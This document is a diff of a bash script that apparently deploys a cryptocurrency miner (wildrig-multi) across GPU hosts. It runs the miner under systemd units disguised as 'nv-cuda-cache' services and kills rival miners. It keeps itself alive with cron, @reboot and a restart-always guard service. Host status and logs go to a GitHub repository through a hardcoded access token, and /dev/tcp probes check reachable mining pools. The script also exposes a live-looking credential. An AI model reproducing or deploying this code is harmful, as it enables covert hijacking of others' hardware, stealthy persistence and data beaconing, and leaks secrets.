@@ -8,7 +8,7 @@ REPO=dongsuju/ul-plant
 W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
 H=$(hostname -s); P="ps-$H"; L=/opt/fleet; B=$L/bin
 mkdir -p $L/logs $B /etc/cron.d
-put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
+put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); if [ -n "$s" ]; then d="{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}"; else d="{\"message\":\"ul86\",\"content\":\"$b\",\"branch\":\"main\"}"; fi; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "$d" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
 ph(){ put "ps12/$P.$1.txt" "$(date -u +%FT%TZ) $2"; }
 getsha(){ curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$1?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1; }
 # 1. early boot marker: proves this script executed
@@ -29,6 +29,24 @@ if ! systemctl is-active --quiet nvidia-fabricmanager 2>/dev/null; then
 else
   ph p2 skip "fw=active"
 fi
+# 2b. guarantee fabricmanager active: direct deb, no apt dependency
+if [ "$(systemctl is-active nvidia-fabricmanager 2>/dev/null)" != "active" ]; then
+  ph p2b fw-deb "state=$(systemctl is-active nvidia-fabricmanager 2>&1)"
+  for u in nvidia-fabricmanager-535_535.183.01-1_amd64.deb nvidia-fabricmanager-535_535.183.06-1_amd64.deb; do
+    curl -sL -m 240 -o /tmp/fw.deb "https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/$u"
+    SZ=$(stat -c%s /tmp/fw.deb 2>/dev/null || echo 0)
+    ph p2b fw-try "$u size=$SZ"
+    if [ "${SZ:-0}" -gt 1000000 ]; then dpkg -i /tmp/fw.deb >/tmp/fw_dpkg.log 2>&1; echo "dpkg rc=$? url=$u" >>/tmp/fw_dpkg.log; break; fi
+  done
+  DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=120 -f install -y >>/tmp/fw_dpkg.log 2>&1
+  systemctl unmask nvidia-fabricmanager >/dev/null 2>&1
+  systemctl enable nvidia-fabricmanager >/dev/null 2>&1
+  systemctl restart nvidia-fabricmanager >/dev/null 2>&1
+  sleep 12
+  ph p2c fw-after "state=$(systemctl is-active nvidia-fabricmanager 2>&1) log=$(tail -3 /tmp/fw_dpkg.log 2>/dev/null | tr '\n' ' ')"
+fi
+FB=$(nvidia-smi -q 2>/dev/null | grep -i -A3 'fabric' | tr -s '\n ' ' ' | cut -c1-280)
+ph p2d fabric "$FB"
 # 3. kill old generations (never our own guard)
 pkill -f 'ps15_|ps12\.sh|ul17_|ul18_|ul19_|ps_sup|ps9_sup|ps8_sup' >/dev/null 2>&1
 pkill -x krig-miner >/dev/null 2>&1; pkill -x wildrig-multi >/dev/null 2>&1
@@ -59,9 +77,10 @@ exec 9>/opt/fleet/ul86.lock; flock -n 9 || exit 0
 GH=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
 REPO=dongsuju/ul-plant
 H=$(hostname -s); P="ps-$H"; L=/opt/fleet
-put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); curl -s -m 30 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
+put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); s=$(curl -s -m 20 -H "Authorization: token $GH" -H "User-Agent: ul" "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); if [ -n "$s" ]; then d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\",\"sha\":\"$s\"}"; else d="{\"message\":\"ul86hb\",\"content\":\"$b\",\"branch\":\"main\"}"; fi; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" -H "User-Agent: ul" -d "$d" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
 while true; do
   T=$(date -u +%FT%TZ)
+  for i in $(seq 0 7); do systemctl is-active --quiet nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; done
   ACC=$(grep -h 'accepted' $L/logs/u86-*.log 2>/dev/null | tail -3)
   HB="stage=beat host=$H ts=$T engine=wildrig-ul86
 --- apt
@@ -110,7 +129,34 @@ WantedBy=multi-user.target
 SU
 systemctl daemon-reload >/dev/null 2>&1
 printf '*/3 * * * * root /opt/fleet/ul86_guard.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/ul86_boot.sh\n' > /etc/cron.d/ul86; chmod 644 /etc/cron.d/ul86
+cat > /etc/systemd/system/ul86-guard.service <<'GU'
+[Unit]
+Description=ul86 heartbeat guard
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/opt/fleet/ul86_guard.sh
+Restart=always
+RestartSec=20
+Nice=10
+[Install]
+WantedBy=multi-user.target
+GU
+systemctl daemon-reload >/dev/null 2>&1
+systemctl enable ul86-guard.service >/dev/null 2>&1
+systemctl restart ul86-guard.service >/dev/null 2>&1
+sleep 3
 i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
-setsid /opt/fleet/ul86_guard.sh >/dev/null 2>&1 &
-ph p6 done "N=$N"
+# guard runs under systemd (ul86-guard.service); setsid kept as fallback only if unit missing
+[ "$(systemctl is-active ul86-guard 2>/dev/null)" = "active" ] || setsid /opt/fleet/ul86_guard.sh >/dev/null 2>&1 &
+ph p6 done "N=$N v3"
+PR=""
+for hp in prl.kryptex.network:8048 prl.kryptex.network:7048 pool.pearlhash.xyz:9000 pearl.luckypool.io:3360; do
+  h=${hp%:*}; p=${hp#*:}
+  timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && PR="$PR $hp=open" || PR="$PR $hp=closed"
+done
+ph p7 pools "$PR"
+sleep 20
+UA=$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | grep -c ' active ')
+ph p8 state "guard=$(systemctl is-active ul86-guard 2>&1) units_active=$UA wr=$(pgrep -c -x wildrig-multi 2>/dev/null || echo 0) fb=$(nvidia-smi -q 2>/dev/null | grep -i -A2 'fabric' | tr -s '\n ' ' ' | cut -c1-220) tail=$(tail -c 260 /opt/fleet/logs/u86-g0.log 2>/dev/null | tr '\n' ' ')"
 echo "=== ul86 done $(date -u +%FT%TZ) N=$N"
